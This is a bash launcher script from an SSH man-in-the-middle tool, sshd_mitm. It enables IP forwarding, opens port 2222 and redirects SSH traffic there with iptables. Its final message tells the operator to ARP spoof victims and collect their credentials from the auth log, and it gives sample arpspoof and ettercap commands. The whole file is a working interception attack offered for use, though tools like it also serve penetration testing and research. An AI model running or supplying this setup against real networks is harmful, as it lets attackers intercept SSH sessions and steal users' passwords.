#!/bin/bash

# run.sh
# Copyright (C) 2017  Joe Testa <jtesta@positronsecurity.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms version 3 of the GNU General Public License as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

if [[ `id -u` != 0 ]]; then
    echo "Error: this script must be run as root."
    exit -1
fi

# Make sure sshd_mitm was correctly installed.
if [[ (! -f /home/ssh-mitm/run.sh) || (! -f /home/ssh-mitm/bin/sshd_mitm) ]]; then
    echo "Error: could not find sshd_mitm.  You need to first run install.sh."
    exit -1
fi

echo "Running sshd_mitm in unprivileged account..."
su - ssh-mitm -c "./run.sh"

echo "Enabling IP forwarding in kernel..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "Changing FORWARD table default policy to ACCEPT..."
iptables -P FORWARD ACCEPT

# Check if the INPUT table has an ACCEPT for destination port 2222.  If not,
# add it.
iptables -nL INPUT | egrep "ACCEPT +tcp +-- +0\.0\.0\.0/0 +0\.0\.0\.0/0 +tcp dpt:2222" > /dev/null
if [[ $? != 0 ]]; then
    echo "Executing: iptables -A INPUT -p tcp --dport 2222 -j ACCEPT"
    iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
fi

# Check if the PREROUTING table has a REDIRECT for port 22 to 2222.  If not,
# add it.
iptables -t nat -nL PREROUTING | egrep "REDIRECT +tcp +-- +0\.0\.0\.0/0 +0\.0\.0\.0/0 +tcp dpt:22 redir ports 2222" > /dev/null
if [[ $? != 0 ]]; then
    echo "Executing: iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222"
    iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222
fi

echo -e "\n\nDone!  Now ARP spoof your victims and watch /var/log/auth.log for credentials.  Logged sessions will be in /home/ssh-mitm/.  Hint: ARP spoofing can either be done with:\n\n\tarpspoof -r -t 192.168.x.1 192.168.x.5\n\n\t\tOR\n\n\tettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//\n\nIf you don't have a list of targets yet, run stop.sh and use JoesAwesomeSSHMITMVictimFinder.py to find them.  Then run this script again.\n"
exit 0
